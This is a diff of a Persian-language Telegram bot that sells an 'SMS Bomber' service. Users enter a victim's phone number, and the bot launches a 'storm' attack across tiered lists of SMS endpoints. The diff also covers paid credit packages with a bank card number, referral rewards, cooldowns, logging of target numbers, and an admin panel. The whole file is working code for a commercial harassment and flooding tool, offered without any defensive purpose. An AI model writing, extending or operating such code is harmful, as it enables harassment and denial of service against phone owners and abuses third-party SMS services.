-            f"🎁 **۵ اعتبار** رایگان به حساب شما اضافه شد!\n\n"
-            f"📊 سطح: {user['tier']}\n"
-            f"💰 اعتبار: {user['credits']}\n\n"
-            f"از منوی زیر استفاده کنید:",
-            reply_markup=await get_main_keyboard(user_id)
-        )
-    else:
-        if user.get('is_banned', 0) == 1:
-            await message.answer("🚫 شما توسط ادمین مسدود شده‌اید!")
-            return
-        
-        await message.answer(
-            f"👋 **خوش برگشتی {first_name}!**\n\n"
-            f"📊 سطح: {user['tier']}\n"
-            f"💰 اعتبار: {user['credits']}\n"
-            f"📱 معرفی‌ها: {user['referral_count']}\n\n"
-            f"از منوی زیر استفاده کنید:",
-            reply_markup=await get_main_keyboard(user_id)
-        )
+        user = await db.create_user(user_id, username, first_name, None, referred_by)
+        if referred_by:
+            await message.answer("🎉 با کد معرف ثبت‌نام کردی! به دوستت ۱ اعتبار اضافه شد.")
+    
+    await message.answer(
+        f"👋 **سلام {first_name}!**\n\n"
+        f"⭐ سطح: {user['tier']}\n"
+        f"💰 اعتبار: {user['credits']}\n"
+        f"📱 معرفی‌ها: {user['referral_count']}\n\n"
+        f"از منوی زیر استفاده کن:",
+        reply_markup=await main_keyboard(user_id)
+    )
 
-@dp.message(Command("cancel"))
-async def cmd_cancel(message: Message, state: FSMContext):
-    await state.clear()
-    await message.answer("❌ عملیات لغو شد!", reply_markup=await get_main_keyboard(message.from_user.id))
+@dp.message(Command("ping"))
+async def cmd_ping(message: Message):
+    await message.answer("🏓 Pong! ربات فعال است!")
 
 @dp.message(Command("stop"))
 async def cmd_stop(message: Message):
-    if bomber_engine.is_running:
-        bomber_engine.stop()
+    if bomber.is_running:
+        bomber.stop()
         await message.answer("⏹️ حمله متوقف شد!")
     else:
         await message.answer("⚠️ هیچ حمله‌ای در حال اجرا نیست!")
 
-# ============================================================
-# هندلر SMS Bomber
-# ============================================================
-
 @dp.callback_query(F.data == "sms_bomb")
-async def sms_bomb_menu(callback: CallbackQuery, state: FSMContext):
+async def sms_bomb(callback: CallbackQuery, state: FSMContext):
     user_id = callback.from_user.id
-    
-    if await db.is_banned(user_id):
-        await callback.answer("🚫 شما مسدود شده‌اید!", show_alert=True)
-        return
-    
     credits = await db.get_credits(user_id)
+    tier = await db.get_tier(user_id)
+    
     if credits <= 0:
         await callback.message.edit_text(
-            "❌ **اعتبار شما کافی نیست!**\n\n"
-            f"💰 اعتبار فعلی: {credits}\n\n"
-            "برای خرید اعتبار از دکمه زیر استفاده کنید:",
+            "❌ **اعتبارت تموم شده!**\n\n"
+            f"💰 اعتبار فعلی: {credits}\n"
+            "برای خرید اعتبار از دکمه زیر استفاده کن:",
             reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                 [InlineKeyboardButton(text="💰 خرید اعتبار", callback_data="buy_credits")],
-                [InlineKeyboardButton(text="🔙 بازگشت", callback_data="back_to_menu")]
+                [InlineKeyboardButton(text="🔙 برگشت", callback_data="back")]
             ])
         )
         await callback.answer()
         return
     
-    can_bomb, remaining, cooldown_msg = await db.check_cooldown(user_id)
+    can_bomb, remaining, msg = await db.check_cooldown(user_id)
     if not can_bomb:
         await callback.message.edit_text(
-            f"⏳ {cooldown_msg}\n\n"
-            f"⏱️ زمان باقی‌مانده: {format_time(remaining)}",
+            f"⏳ {msg}",
             reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text="🔙 بازگشت", callback_data="back_to_menu")]
+                [InlineKeyboardButton(text="🔙 برگشت", callback_data="back")]
             ])
         )
         await callback.answer()
         return
+    
+    endpoints_count = len(SITES)
+    if tier == 'Free':
+        endpoints_count = min(endpoints_count, 30)
+    elif tier == 'VIP':
+        endpoints_count = min(endpoints_count, 80)
     
     await callback.message.edit_text(
         f"📱 **SMS Bomber**\n\n"
-        f"📱 شماره هدف را وارد کنید:\n"
+        f"📱 شماره هدف رو وارد کن:\n"
         f"مثال: `09123456789`\n\n"
-        f"⚠️ هر بمب **۱ اعتبار** مصرف می‌کند.\n"
-        f"💰 اعتبار شما: {credits}\n\n"
-        f"📊 سطح شما: {await db.get_user_tier(user_id)}\n"
-        f"📌 اندپوینت‌ها: {len(endpoint_manager.get_endpoints_for_tier(await db.get_user_tier(user_id)))} عدد\n\n"
+        f"💰 اعتبار: {credits}\n"
+        f"⭐ سطح: {tier}\n"
+        f"📊 اندپوینت‌ها: {endpoints_count}\n\n"
+        f"⚠️ هر حمله **۱ اعتبار** مصرف می‌کنه.\n"
         f"برای لغو /cancel",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="🔙 بازگشت", callback_data="back_to_menu")]
+            [InlineKeyboardButton(text="🔙 برگشت", callback_data="back")]
         ])
     )
     await state.set_state(BombState.waiting_for_phone)
@@ -1054,8 +631,8 @@ async def handle_phone(message: Message, state: FSMContext):
     user_id = message.from_user.id
     phone = message.text.strip()
     
-    if not is_valid_phone(phone):
-        await message.reply_text("❌ شماره نامعتبر! لطفاً یک شماره ۱۰ رقمی وارد کنید.\nمثال: `09123456789`")
+    if not phone.isdigit() or len(phone) < 10:
+        await message.reply_text("❌ شماره نامعتبر! لطفاً یک شماره ۱۰ رقمی وارد کن.")
         return
     
     if phone.startswith('0'):
@@ -1063,18 +640,22 @@ async def handle_phone(message: Message, state: FSMContext):
     
     credits = await db.get_credits(user_id)
     if credits <= 0:
-        await message.reply_text("❌ اعتبار شما کافی نیست!")
+        await message.reply_text("❌ اعتبارت تموم شده!")
         await state.clear()
         return
     
-    can_bomb, remaining, cooldown_msg = await db.check_cooldown(user_id)
+    can_bomb, remaining, msg = await db.check_cooldown(user_id)
     if not can_bomb:
-        await message.reply_text(f"⏳ {cooldown_msg}")
+        await message.reply_text(f"⏳ {msg}")
         await state.clear()
         return
     
-    tier = await db.get_user_tier(user_id)
-    endpoints = endpoint_manager.get_endpoints_for_tier(tier)
+    tier = await db.get_tier(user_id)
+    endpoints = SITES.copy()
+    if tier == 'Free':
+        endpoints = endpoints[:30]
+    elif tier == 'VIP':
+        endpoints = endpoints[:80]
     
     if not endpoints:
         await message.reply_text("❌ هیچ اندپوینتی در دسترس نیست!")
@@ -1086,39 +667,25 @@ async def handle_phone(message: Message, state: FSMContext):
         await state.clear()
         return
     
-    msg = await message.reply_text(
+    status_msg = await message.reply_text(
         f"🚀 **شروع حمله به {phone}...**\n"
         f"📊 تعداد اندپوینت: {len(endpoints)}\n"
         f"⭐ سطح: {tier}\n"
-        f"⏳ لطفاً صبر کنید...\n"
+        f"⏳ لطفاً صبر کن...\n"
         f"⚠️ برای توقف /stop"
     )
     
     await db.update_last_bomb_time(user_id)
     
-    def on_result(result):
-        asyncio.create_task(handle_bomb_result(message, result, phone, msg, user_id))
+    def on_complete(result):
+        asyncio.create_task(send_result(message, result, phone, status_msg, user_id))
     
-    bomber_engine.run_bomb(
-        endpoints=endpoints,
-        phone=phone,
-        callback=None,
-        mode="storm",
-        on_complete=on_result
-    )
-    
+    bomber.run_bomb(endpoints, phone, mode="storm", on_complete=on_complete)
     await state.clear()
 
-async def handle_bomb_result(message: Message, result: dict, phone: str, status_msg: Message, user_id: int):
-    await db.log_bomb(
-        user_id=user_id,
-        target_phone=phone,
-        endpoints_used=result['total'],
-        success_count=result['success'],
-        failed_count=result['failed'] + result['errors']
-    )
-    
+async def send_result(message: Message, result: dict, phone: str, status_msg: Message, user_id: int):
     new_credits = await db.get_credits(user_id)
+    await db.log_bomb(user_id, phone, result['success'], result['failed'] + result['errors'])
     
     msg = f"""
 ✅ **حمله به {phone} کامل شد!**
@@ -1129,660 +696,224 @@ async def handle_bomb_result(message: Message, result: dict, phone: str, status_
 • ❌ ناموفق: {result['failed']}
 • ⚠️ خطا: {result['errors']}
 
-💰 اعتبار باقی‌مانده: {new_credits}
+💰 اعتبار باقی‌مونده: {new_credits}
     """
-    
-    await status_msg.edit_text(msg, reply_markup=await get_main_keyboard(user_id))
-
-# ============================================================
-# هندلر پروفایل
-# ============================================================
+    await status_msg.edit_text(msg, reply_markup=await main_keyboard(user_id))
 
 @dp.callback_query(F.data == "profile")
 async def show_profile(callback: CallbackQuery):
     user_id = callback.from_user.id
     user = await db.get_user(user_id)
-    if not user:
-        await callback.answer("❌ کاربر یافت نشد!")
-        return
-    
-    stats = await db.get_user_stats(user_id)
+    stats = await db.get_stats(user_id)
     
     tier_emojis = {'Free': '🆓', 'VIP': '⭐', 'Pro': '💎'}
-    tier_emoji = tier_emojis.get(user['tier'], '🆓')
     
-    msg = f"""
-👤 **پروفایل شما**
-
-🆔 شناسه: `{user_id}`
-👤 نام: {user.get('first_name', '')}
-⭐ سطح: {tier_emoji} {user['tier']}
-💰 اعتبار: {user['credits']}
-📱 معرفی‌ها: {user['referral_count']}
-📊 کل بمب‌ها: {stats['total_bombs']}
-✅ موفق: {stats['total_success']}
-❌ ناموفق: {stats['total_failed']}
-📅 تاریخ ثبت‌نام: {user['registered_at'][:10]}
-
-📌 **سقف اندپوینت:** {TIER_LIMITS.get(user['tier'], 30)}
-⏱️ **زمان انتظار:** {TIER_COOLDOWNS.get(user['tier'], 300)//60} دقیقه
-    """
-    
-    keyboard = [
-        [InlineKeyboardButton(text="🔄 بروزرسانی", callback_data="profile")],
-        [InlineKeyboardButton(text="📋 تاریخچه بمب‌ها", callback_data="bomb_history")],
-        [InlineKeyboardButton(text="🔙 بازگشت", callback_data="back_to_menu")]
-    ]
-    
-    await callback.message.edit_text(msg, reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))
+    await callback.message.edit_text(
+        f"👤 **پروفایل شما**\n\n"
+        f"🆔 شناسه: `{user_id}`\n"
+        f"👤 نام: {user.get('first_name', '')}\n"
+        f"⭐ سطح: {tier_emojis.get(user['tier'], '🆓')} {user['tier']}\n"
+        f"💰 اعتبار: {user['credits']}\n"
+        f"📱 معرفی‌ها: {user['referral_count']}\n"
+        f"📊 کل بمب‌ها: {stats['total_bombs']}\n"
+        f"✅ موفق: {stats['total_success']}\n"
+        f"❌ ناموفق: {stats['total_failed']}\n"
+        f"📅 ثبت‌نام: {user['registered_at'][:10]}",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="🔙 برگشت", callback_data="back")]
+        ])
+    )
     await callback.answer()
-
-@dp.callback_query(F.data == "bomb_history")
-async def show_bomb_history(callback: CallbackQuery):
-    user_id = callback.from_user.id
-    history = await db.get_bomb_history(user_id, limit=10)
-    
-    if not history:
-        await callback.message.edit_text(
-            "📋 هنوز هیچ بمبی ارسال نکرده‌اید!",
-            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text="🔙 بازگشت", callback_data="profile")]
-            ])
-        )
-        await callback.answer()
-        return
-    
-    msg = "📋 **تاریخچه آخرین بمب‌ها:**\n\n"
-    for h in history:
-        msg += f"📱 {h['target_phone']}\n"
-        msg += f"✅ {h['success_count']} موفق | ❌ {h['failed_count']} ناموفق\n"
-        msg += f"📅 {h['created_at'][:16]}\n"
-        msg += "─────────────\n"
-    
-    keyboard = [
-        [InlineKeyboardButton(text="🔙 بازگشت", callback_data="profile")]
-    ]
-    
-    await callback.message.edit_text(msg, reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))
-    await callback.answer()
-
-# ============================================================
-# هندلر سیستم معرفی
-# ============================================================
 
 @dp.callback_query(F.data == "referral")
 async def show_referral(callback: CallbackQuery):
     user_id = callback.from_user.id
-    referral_link = await db.get_referral_link(user_id)
-    referral_count = await db.get_referral_count(user_id)
+    user = await db.get_user(user_id)
+    code = user.get('referral_code', '')
+    count = user.get('referral_count', 0)
     
-    progress = min(referral_count, 3)
-    progress_bar = "█" * progress + "░" * (3 - progress)
-    is_vip = await db.get_user_tier(user_id) == 'VIP'
+    progress = min(count, 3)
+    bar = "█" * progress + "░" * (3 - progress)
     
-    if is_vip:
-        status = "✅ **شما قبلاً به VIP ارتقا یافته‌اید!**"
-    else:
-        status = f"⭐ **ارتقا به VIP:**\nپیشرفت: [{progress_bar}] {progress}/3"
-    
-    msg = f"""
-🔗 **سیستم معرفی**
-
-📱 لینک معرفی شما:
-`{referral_link}`
-
-📊 تعداد معرفی‌ها: {referral_count}
-
-{status}
-
-💡 با معرفی ۳ کاربر به VIP ارتقا می‌یابید!
-✨ مزایای VIP:
-• ۸۰ اندپوینت
-• ۳ دقیقه زمان انتظار
-    """
-    
-    keyboard = [
-        [InlineKeyboardButton(text="📋 لیست معرفی‌ها", callback_data="referral_list")],
-        [InlineKeyboardButton(text="🔙 بازگشت", callback_data="back_to_menu")]
-    ]
-    
-    await callback.message.edit_text(msg, reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))
+    await callback.message.edit_text(
+        f"🔗 **سیستم معرفی**\n\n"
+        f"📱 لینک معرفی تو:\n"
+        f"`https://t.me/SMSBOMBER_free1_bot?start=ref_{code}`\n\n"
+        f"📊 تعداد معرفی‌ها: {count}\n"
+        f"⭐ پیشرفت به VIP: [{bar}] {progress}/3\n\n"
+        f"💡 با معرفی ۳ کاربر به **VIP** ارتقا پیدا می‌کنی!\n"
+        f"✨ مزایای VIP:\n"
+        f"• ۸۰ اندپوینت\n"
+        f"• ۳ دقیقه زمان انتظار",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="🔙 برگشت", callback_data="back")]
+        ])
+    )
     await callback.answer()
-
-@dp.callback_query(F.data == "referral_list")
-async def show_referral_list(callback: CallbackQuery):
-    user_id = callback.from_user.id
-    referrals = await db.get_referral_list(user_id)
-    
-    if not referrals:
-        await callback.message.edit_text(
-            "📋 هنوز کسی را معرفی نکرده‌اید!",
-            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text="🔙 بازگشت", callback_data="referral")]
-            ])
-        )
-        await callback.answer()
-        return
-    
-    msg = "📋 **لیست کاربرانی که معرفی کرده‌اید:**\n\n"
-    for r in referrals[:10]:
-        name = r.get('first_name', '') or r.get('username', 'کاربر')
-        msg += f"👤 {name}\n"
-        msg += f"📅 {r['registered_at'][:10]}\n"
-        msg += "─────────────\n"
-    
-    if len(referrals) > 10:
-        msg += f"\nو {len(referrals) - 10} کاربر دیگر..."
-    
-    keyboard = [
-        [InlineKeyboardButton(text="🔙 بازگشت", callback_data="referral")]
-    ]
-    
-    await callback.message.edit_text(msg, reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))
-    await callback.answer()
-
-# ============================================================
-# هندلر خرید اعتبار
-# ============================================================
 
 @dp.callback_query(F.data == "buy_credits")
-async def buy_credits_menu(callback: CallbackQuery):
-    keyboard = []
-    for key, package in CREDIT_PACKAGES.items():
-        keyboard.append([
-            InlineKeyboardButton(
-                text=f"📦 {package['label']}",
-                callback_data=f"buy_package_{key}"
-            )
-        ])
-    keyboard.append([InlineKeyboardButton(text="🔙 بازگشت", callback_data="back_to_menu")])
+async def buy_credits(callback: CallbackQuery):
+    keyboard = [
+        [InlineKeyboardButton(text="📦 ۵۰ بمب - ۲۰,۰۰۰ تومان", callback_data="buy_50")],
+        [InlineKeyboardButton(text="📦 ۱۵۰ بمب - ۵۰,۰۰۰ تومان", callback_data="buy_150")],
+        [InlineKeyboardButton(text="📦 ۵۰۰ بمب - ۱۵۰,۰۰۰ تومان", callback_data="buy_500")],
+        [InlineKeyboardButton(text="🔙 برگشت", callback_data="back")]
+    ]
     
     await callback.message.edit_text(
         "💰 **خرید اعتبار**\n\n"
-        "بسته مورد نظر را انتخاب کنید:\n"
-        "پس از انتخاب، اسکرین‌شات پرداخت را ارسال کنید.\n\n"
-        "📌 **راهنمای پرداخت:**\n"
-        "۱. مبلغ را به شماره کارت زیر واریز کنید:\n"
-        "`6037-9918-1234-5678`\n"
-        "۲. اسکرین‌شات را ارسال کنید\n"
-        "۳. پس از تأیید ادمین، اعتبار اضافه می‌شود",
+        "بسته مورد نظرت رو انتخاب کن:\n\n"
+        "💳 شماره کارت: `6037-9918-1234-5678`\n"
+        "👤 به نام: `حسین محمدی`\n\n"
+        "📌 بعد از واریز، اسکرین‌شات رو به ادمین بفرست.",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard)
     )
     await callback.answer()
 
-@dp.callback_query(F.data.startswith("buy_package_"))
-async def select_package(callback: CallbackQuery, state: FSMContext):
-    package_key = callback.data.replace("buy_package_", "")
-    package = CREDIT_PACKAGES.get(package_key)
-    
-    if not package:
-        await callback.answer("❌ بسته نامعتبر!")
-        return
-    
-    await state.update_data(package=package_key, amount=package['amount'])
+@dp.callback_query(F.data.startswith("buy_"))
+async def buy_package(callback: CallbackQuery):
+    package = callback.data.replace("buy_", "")
+    packages = {
+        '50': {'amount': 50, 'price': 20000},
+        '150': {'amount': 150, 'price': 50000},
+        '500': {'amount': 500, 'price': 150000}
+    }
+    pkg = packages.get(package, {'amount': 50, 'price': 20000})
     
     await callback.message.edit_text(
-        f"📦 **بسته {package['label']}**\n\n"
-        f"💰 مبلغ: {package['price']:,} تومان\n"
-        f"📱 اعتبار: {package['amount']} بمب\n\n"
-        "📸 **لطفاً اسکرین‌شات پرداخت را ارسال کنید:**\n\n"
-        "💳 شماره کارت: `6037-9918-1234-5678`\n"
-        "👤 به نام: `حسین محمدی`\n\n"
-        "برای لغو /cancel",
+        f"📦 **بسته {pkg['amount']} بمب**\n\n"
+        f"💰 مبلغ: {pkg['price']:,} تومان\n"
+        f"📱 اعتبار: {pkg['amount']} بمب\n\n"
+        f"💳 شماره کارت: `6037-9918-1234-5678`\n"
+        f"👤 به نام: `حسین محمدی`\n\n"
+        f"📸 بعد از واریز، اسکرین‌شات رو به ادمین بفرست.",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="🔙 بازگشت", callback_data="buy_credits")]
+            [InlineKeyboardButton(text="🔙 برگشت", callback_data="buy_credits")]
         ])
     )
-    await state.set_state(PaymentState.waiting_for_screenshot)
     await callback.answer()
-
-@dp.message(PaymentState.waiting_for_screenshot)
-async def handle_payment_screenshot(message: Message, state: FSMContext):
-    user_id = message.from_user.id
-    
-    if not message.photo:
-        await message.reply_text("❌ لطفاً یک عکس (اسکرین‌شات) ارسال کنید!\nبرای لغو /cancel")
-        return
-    
-    data = await state.get_data()
-    package_key = data.get('package')
-    amount = data.get('amount')
-    
-    if not package_key or not amount:
-        await message.reply_text("❌ خطا در اطلاعات! لطفاً دوباره تلاش کنید.")
-        await state.clear()
-        return
-    
-    photo = message.photo[-1]
-    file = await bot.get_file(photo.file_id)
-    
-    os.makedirs("payments/pending", exist_ok=True)
-    filename = f"payments/pending/payment_{user_id}_{int(datetime.now().timestamp())}.jpg"
-    await bot.download_file(file.file_path, filename)
-    
-    request_id = await db.add_payment_request(user_id, package_key, amount, filename)
-    
-    for admin_id in ADMIN_IDS:
-        try:
-            await bot.send_photo(
-                admin_id,
-                photo=FSInputFile(filename),
-                caption=f"📋 **درخواست پرداخت جدید**\n\n🆔 #{request_id}\n👤 کاربر: {message.from_user.first_name} (@{message.from_user.username})\n🆔 کاربر: {user_id}\n📦 بسته: {package_key}\n💰 مبلغ: {amount:,} تومان\n\nبرای تأیید یا رد، از پنل مدیریت استفاده کنید."
-            )
-        except:
-            pass
-    
-    await message.reply_text(
-        "✅ **اسکرین‌شات شما با موفقیت ارسال شد!**\n\n"
-        "⏳ درخواست شما در انتظار تأیید ادمین است.\n"
-        "پس از تأیید، اعتبار به حساب شما اضافه می‌شود.",
-        reply_markup=await get_main_keyboard(user_id)
-    )
-    await state.clear()
-
-# ============================================================
-# هندلر آمار
-# ============================================================
 
 @dp.callback_query(F.data == "stats")
-async def user_stats(callback: CallbackQuery):
+async def show_stats(callback: CallbackQuery):
     user_id = callback.from_user.id
-    stats = await db.get_user_stats(user_id)
+    stats = await db.get_stats(user_id)
     
-    tier_emoji = {'Free': '🆓', 'VIP': '⭐', 'Pro': '💎'}.get(stats['tier'], '🆓')
-    
-    msg = f"""
-📊 **آمار شما**
+    await callback.message.edit_text(
+        f"📊 **آمار تو**\n\n"
+        f"⭐ سطح: {stats['tier']}\n"
+        f"💰 اعتبار: {stats['credits']}\n"
+        f"📱 معرفی‌ها: {stats['referral_count']}\n"
+        f"📱 کل بمب‌ها: {stats['total_bombs']}\n"
+        f"✅ موفق: {stats['total_success']}\n"
+        f"❌ ناموفق: {stats['total_failed']}",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="🔙 برگشت", callback_data="back")]
+        ])
+    )
+    await callback.answer()
 
-⭐ سطح: {tier_emoji} {stats['tier']}
-💰 اعتبار: {stats['credits']}
-📱 معرفی‌ها: {stats['referral_count']}
-
-📱 **بمب‌ها:**
-• کل ارسال‌ها: {stats['total_bombs']}
-• ✅ موفق: {stats['total_success']}
-• ❌ ناموفق: {stats['total_failed']}
-• 📋 تعداد لاگ‌ها: {stats['total_logs']}
-    """
-    
-    keyboard = [
-        [InlineKeyboardButton(text="🔄 بروزرسانی", callback_data="stats")],
-        [InlineKeyboardButton(text="🔙 بازگشت", callback_data="back_to_menu")]
-    ]
-    
-    await callback.message.edit_text(msg, reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))
+@dp.callback_query(F.data == "back")
+async def go_back(callback: CallbackQuery):
+    user_id = callback.from_user.id
+    await callback.message.edit_text(
+        "🏠 **منوی اصلی**",
+        reply_markup=await main_keyboard(user_id)
+    )
     await callback.answer()
 
 # ============================================================
-# دکمه بازگشت
-# ============================================================
-
-@dp.callback_query(F.data == "back_to_menu")
-async def back_to_menu(callback: CallbackQuery):
-    user_id = callback.from_user.id
-    await callback.message.edit_text("🏠 **منوی اصلی**", reply_markup=await get_main_keyboard(user_id))
-    await callback.answer()
-
-# ============================================================
-# هندلر پنل مدیریت
+# پنل مدیریت
 # ============================================================
 
 @dp.callback_query(F.data == "admin_panel")
-async def admin_panel_menu(callback: CallbackQuery):
+async def admin_panel(callback: CallbackQuery):
     user_id = callback.from_user.id
-    if not await AdminPanel.is_admin(user_id):
-        await callback.answer("❌ شما دسترسی ادمین ندارید!")
+    if user_id not in ADMIN_IDS:
+        await callback.answer("❌ شما دسترسی ادمین نداری!")
         return
     
-    keyboard = await AdminPanel.show_admin_menu(user_id)
-    await callback.message.edit_text("⚙️ **پنل مدیریت**\n\nیک گزینه را انتخاب کنید:", reply_markup=keyboard)
+    keyboard = [
+        [InlineKeyboardButton(text="👥 لیست کاربران", callback_data="admin_users")],
+        [InlineKeyboardButton(text="📊 آمار کلی", callback_data="admin_stats_all")],
+        [InlineKeyboardButton(text="📢 پیام همگانی", callback_data="admin_broadcast")],
+        [InlineKeyboardButton(text="🔙 برگشت", callback_data="back")]
+    ]
+    
+    await callback.message.edit_text(
+        "⚙️ **پنل مدیریت**\n\n"
+        "یک گزینه رو انتخاب کن:",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard)
+    )
     await callback.answer()
 
-@dp.callback_query(F.data == "admin_payments")
-async def admin_payments(callback: CallbackQuery):
+@dp.callback_query(F.data == "admin_users")
+async def admin_users(callback: CallbackQuery):
     user_id = callback.from_user.id
-    if not await AdminPanel.is_admin(user_id):
-        await callback.answer("❌ شما دسترسی ادمین ندارید!")
+    if user_id not in ADMIN_IDS:
+        await callback.answer("❌ شما دسترسی ادمین نداری!")
         return
     
-    payments = await db.get_pending_payments()
-    
-    if not payments:
+    if not db.users:
         await callback.message.edit_text(
-            "📋 هیچ درخواست پرداخت جدیدی وجود ندارد.",
+            "📋 هیچ کاربری وجود نداره!",
             reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text="🔙 بازگشت", callback_data="admin_panel")]
+                [InlineKeyboardButton(text="🔙 برگشت", callback_data="admin_panel")]
             ])
         )
         await callback.answer()
         return
     
-    payment = payments[0]
-    keyboard = await AdminPanel.build_payment_keyboard(payment['id'])
-    
-    msg = f"""
-📋 **درخواست پرداخت #{payment['id']}**
-
-👤 کاربر: {payment.get('first_name', '')} (@{payment.get('username', 'نامشخص')})
-🆔 شناسه: {payment['user_id']}
-📦 بسته: {payment['package']}
-💰 مبلغ: {payment['amount']:,} تومان
-📅 تاریخ: {payment['created_at']}
-🖼️ اسکرین‌شات: {payment['screenshot_path']}
-
-تعداد کل درخواست‌ها: {len(payments)}
-    """
-    
-    await callback.message.edit_text(msg, reply_markup=keyboard)
-    await callback.answer()
-
-@dp.callback_query(F.data.startswith("approve_payment_"))
-async def approve_payment(callback: CallbackQuery):
-    user_id = callback.from_user.id
-    if not await AdminPanel.is_admin(user_id):
-        await callback.answer("❌ شما دسترسی ادمین ندارید!")
-        return
-    
-    payment_id = int(callback.data.replace("approve_payment_", ""))
-    success = await db.approve_payment(payment_id, f"تأیید شده توسط ادمین {user_id}")
-    
-    if success:
-        payment = await db.get_payment_request(payment_id)
-        if payment:
-            try:
-                await bot.send_message(payment['user_id'], f"✅ **پرداخت شما تأیید شد!**\n\n💰 {payment['amount']} اعتبار به حساب شما اضافه شد.\n📦 بسته: {payment['package']}\n\nاز شما متشکریم! 🙏")
-            except:
-                pass
-        await callback.answer("✅ پرداخت تأیید شد!")
-    else:
-        await callback.answer("❌ خطا در تأیید پرداخت!")
-    
-    await admin_payments(callback)
-
-@dp.callback_query(F.data.startswith("reject_payment_"))
-async def reject_payment(callback: CallbackQuery):
-    user_id = callback.from_user.id
-    if not await AdminPanel.is_admin(user_id):
-        await callback.answer("❌ شما دسترسی ادمین ندارید!")
-        return
-    
-    payment_id = int(callback.data.replace("reject_payment_", ""))
-    success = await db.reject_payment(payment_id, f"رد شده توسط ادمین {user_id}")
-    
-    if success:
-        payment = await db.get_payment_request(payment_id)
-        if payment:
-            try:
-                await bot.send_message(payment['user_id'], f"❌ **پرداخت شما رد شد!**\n\nدلیل: اسکرین‌شات نامعتبر یا اطلاعات ناقص.\n\nلطفاً دوباره تلاش کنید.")
-            except:
-                pass
-        await callback.answer("❌ پرداخت رد شد!")
-    else:
-        await callback.answer("❌ خطا در رد پرداخت!")
-    
-    await admin_payments(callback)
-
-@dp.callback_query(F.data == "admin_users")
-async def admin_users(callback: CallbackQuery):
-    user_id = callback.from_user.id
-    if not await AdminPanel.is_admin(user_id):
-        await callback.answer("❌ شما دسترسی ادمین ندارید!")
-        return
-    
-    users = await db.get_all_users(offset=0, limit=10)
-    
-    if not users:
-        await callback.message.edit_text("📋 هیچ کاربری یافت نشد.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="🔙 بازگشت", callback_data="admin_panel")]
-        ]))
-        await callback.answer()
-        return
-    
-    msg = "👥 **لیست کاربران (صفحه ۱):**\n\n"
-    for u in users:
-        status = "🚫" if u.get('is_banned', 0) == 1 else "✅"
-        tier_emoji = {'Free': '🆓', 'VIP': '⭐', 'Pro': '💎'}.get(u['tier'], '🆓')
-        msg += f"{status} 🆔 `{u['user_id']}`\n"
-        msg += f"👤 {u.get('first_name', '')} (@{u.get('username', 'نامشخص')})\n"
-        msg += f"📊 {tier_emoji} {u['tier']} | 💰 {u['credits']} | 📱 {u['referral_count']}\n"
-        msg += "─────────────\n"
-    
-    keyboard = [
-        [InlineKeyboardButton(text="📋 مشاهده کاربر", callback_data="admin_view_user")],
-        [InlineKeyboardButton(text="🔙 بازگشت", callback_data="admin_panel")]
-    ]
-    
-    await callback.message.edit_text(msg, reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))
-    await callback.answer()
-
-@dp.callback_query(F.data == "admin_view_user")
-async def admin_view_user(callback: CallbackQuery, state: FSMContext):
-    user_id = callback.from_user.id
-    if not await AdminPanel.is_admin(user_id):
-        await callback.answer("❌ شما دسترسی ادمین ندارید!")
-        return
+    msg = "👥 **لیست کاربران:**\n\n"
+    for uid, u in list(db.users.items())[:10]:
+        status = "🚫" if u.get('is_banned') else "✅"
+        msg += f"{status} 🆔 `{uid}` | {u['tier']} | 💰{u['credits']}\n"
     
     await callback.message.edit_text(
-        "👤 **مدیریت کاربر**\n\nشناسه کاربر (User ID) را وارد کنید:\nمثال: `123456789`\n\nبرای لغو /cancel",
+        msg,
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="🔙 بازگشت", callback_data="admin_users")]
+            [InlineKeyboardButton(text="🔙 برگشت", callback_data="admin_panel")]
         ])
     )
-    await state.set_state(AdminState.waiting_for_user_id)
     await callback.answer()
 
-@dp.message(AdminState.waiting_for_user_id)
-async def handle_admin_user_id(message: Message, state: FSMContext):
-    user_id = message.from_user.id
-    if not await AdminPanel.is_admin(user_id):
-        await message.reply_text("❌ شما دسترسی ادمین ندارید!")
-        await state.clear()
+@dp.callback_query(F.data == "admin_stats_all")
+async def admin_stats_all(callback: CallbackQuery):
+    user_id = callback.from_user.id
+    if user_id not in ADMIN_IDS:
+        await callback.answer("❌ شما دسترسی ادمین نداری!")
         return
     
-    target_id = message.text.strip()
-    if not target_id.isdigit():
-        await message.reply_text("❌ شناسه نامعتبر! لطفاً یک عدد وارد کنید.")
-        return
-    
-    target_id = int(target_id)
-    user = await db.get_user(target_id)
-    
-    if not user:
-        await message.reply_text("❌ کاربری با این شناسه یافت نشد!")
-        await state.clear()
-        return
-    
-    keyboard = await AdminPanel.build_user_keyboard(target_id)
-    
-    msg = f"""
-👤 **اطلاعات کاربر**
-
-🆔 شناسه: `{target_id}`
-👤 نام: {user.get('first_name', '')} (@{user.get('username', 'نامشخص')})
-⭐ سطح: {user['tier']}
-💰 اعتبار: {user['credits']}
-📱 معرفی‌ها: {user['referral_count']}
-🚫 وضعیت: {'مسدود' if user.get('is_banned', 0) == 1 else 'فعال'}
-📅 ثبت‌نام: {user['registered_at']}
-    """
-    
